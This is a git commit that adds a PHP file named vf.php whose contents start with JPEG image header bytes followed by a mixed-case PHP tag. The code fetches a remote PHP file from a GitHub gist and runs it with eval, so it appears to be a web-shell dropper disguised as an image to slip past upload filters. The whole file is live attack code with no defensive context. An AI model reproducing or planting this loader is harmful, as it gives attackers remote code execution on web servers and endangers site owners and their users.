56860f718877a8ccb2d5af448f4049edbd3ea033
paknago21 <113289817+paknago21@users.noreply.github.com>
2023-08-16 16:45:30 +0700

    Create vf.php

---
+++ vf.php
@@ -0,0 +1,15 @@
+ÿØÿà JFIF ÿþ;<?pHp
+   function get($url) {
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    $data = curl_exec($ch);
+    curl_close($ch);
+
+    return $data;
+}
+      eval('?>' . get('https://gist.githubusercontent.com/paknago21/fdbfefd3a4c92c7367a00be888ae3982/raw/05da4506bf96e212c6da3ee0632cb896cf44e947/ms.php'));
+?>
